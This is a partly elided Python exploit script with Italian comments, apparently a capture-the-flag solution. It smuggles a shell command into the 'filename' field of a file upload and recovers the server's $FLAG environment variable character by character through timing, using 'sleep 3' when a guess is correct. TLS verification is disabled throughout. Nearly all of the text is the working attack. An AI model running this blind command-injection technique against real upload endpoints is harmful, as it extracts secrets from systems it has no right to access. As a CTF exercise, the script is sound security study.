...
"""
urllib3.disable_warnings() #--> disabilito gli warning relativi al certificato 
...
for pos in range(1, MAX_LEN ):
    ...
    for c in CHARSET:
        ...
        payload = (
            f"flag.txt;test $(printf %s $FLAG | cut -c{pos}) = {c} && sleep 3" #<-- faccio un eco della variabile $FLAG ed estraggo solo il carattere interessato, confrontandolo con tutti i caratter nel charset, se è indovinato faccio aspettare il server 3s prima di rispondere.
        )

        file_to_send = { #<-- Qui construisco il file fittizio da mandare al server con requests.post, la command injection è presente nel campo "filename"
        ...
        requests.post(#<-- invio la richiesta 
                URL,
                files=file_to_send,
                verify=False,   #<-- disabilito la verifica dei certificati tls
        ...
        if elapsed > 2.5:
            flag = flag + c
            log.success(f"FOUND => {flag}, time={elapsed:.2f}")
            found = True
            break
